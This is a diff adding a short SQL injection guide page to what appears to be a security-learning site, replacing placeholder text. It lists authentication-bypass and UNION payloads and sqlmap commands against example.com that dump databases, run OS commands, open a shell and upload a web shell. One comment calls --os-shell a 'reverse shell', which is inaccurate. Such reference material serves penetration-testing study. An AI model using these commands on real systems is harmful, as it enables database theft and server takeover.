@@ -1,13 +1,64 @@
 ---
 title: 💉 SQL Injection
-description: TBD
+description: SQL Injection (SQLi) is a code injection technique that exploits a security vulnerability in an application's software by manipulating SQL queries.
 slug: guide/sqli
-sidebar:
-  order: 6
+head:
+  - tag: title
+    content: SQL Injection
 ---
 
-Ipsa illo quod rerum sed ut voluptas.
+import { LinkCard } from "@astrojs/starlight/components";
 
-Quidem voluptatem eos ut aliquam odio quis vel.
+SQL Injection (SQLi) is a code injection technique that exploits a security vulnerability in an application's software by manipulating SQL queries.
 
-Architecto ab expedita accusantium est mollitia alias. Qui quaerat iusto optio facilis omnis ea.
+This can allow attackers to view, modify, or delete data in the database.
+
+It is one of the most common web application vulnerabilities and can be used to bypass authentication, retrieve sensitive data, and execute administrative operations on the database.
+
+```txt
+' OR 1=1 --
+" OR 1=1 UNION SELECT username, password FROM users --
+```
+
+<LinkCard
+  title="PortSwigger SQL Injection Cheat Sheet"
+  href="https://portswigger.net/web-security/sql-injection/cheat-sheet"
+  target="_blank"
+/>
+
+## sqlmap
+
+sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities.
+
+It is written in Python and supports a wide range of databases, including MySQL, PostgreSQL, Oracle, Microsoft SQL Server, and SQLite.
+
+```bash
+# Get database information
+sqlmap -u "http://example.com/vuln.php?id=1" --dbs
+
+# Get all data from a specific table
+sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name --dump
+
+# Get all data from all tables
+sqlmap -u "http://example.com/vuln.php?id=1" --dump
+
+# Get all columns from a specific table
+sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name --columns
+
+# Get all data from a specific column
+sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name -C column_name --dump
+
+# Execute arbitrary SQL queries
+sqlmap -u "http://example.com/vuln.php?id=1" --sql-query "SELECT * FROM users"
+
+# Execute arbitrary commands on the server
+sqlmap -u "http://example.com/vuln.php?id=1" --os-cmd "whoami"
+
+# Get a reverse shell
+sqlmap -u "http://example.com/vuln.php?id=1" --os-shell
+
+# Upload a file to the server
+sqlmap -u "http://example.com/vuln.php?id=1" --file-write /path/to/file --file-dest /var/www/html/shell.php
+```
+
+<LinkCard title="sqlmap" href="https://sqlmap.org/" target="_blank" />
